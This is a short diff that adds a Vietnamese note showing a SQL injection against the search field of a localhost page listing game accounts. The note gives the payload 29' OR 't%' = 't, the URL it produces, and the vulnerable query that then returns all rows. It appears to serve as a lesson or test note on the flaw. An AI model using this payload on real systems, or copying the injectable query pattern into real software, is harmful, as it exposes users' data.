@@ -1,0 +1,8 @@
+http://localhost/danh-sach-acc-dang-ban-test/?game=1&search=29
+câu truy vấn hacker điền vào trong ô input search sẽ là :
+29' OR 't%' = 't
+==> Đường dẫn mới sẽ là : 
+http://localhost/danh-sach-acc-dang-ban-test/?game=1&search=29' OR 't%' = 't
+==> Câu lệnh truy vấn SQL khi này : 
+SELECT * FROM `posts` WHERE `loai_game` = '1' AND `id_post` LIKE '%29' OR 't%' = 't%'
+==> 't%' = 't%' luôn đúng nên nó sẽ hiển thị toàn bộ thông tin ra.
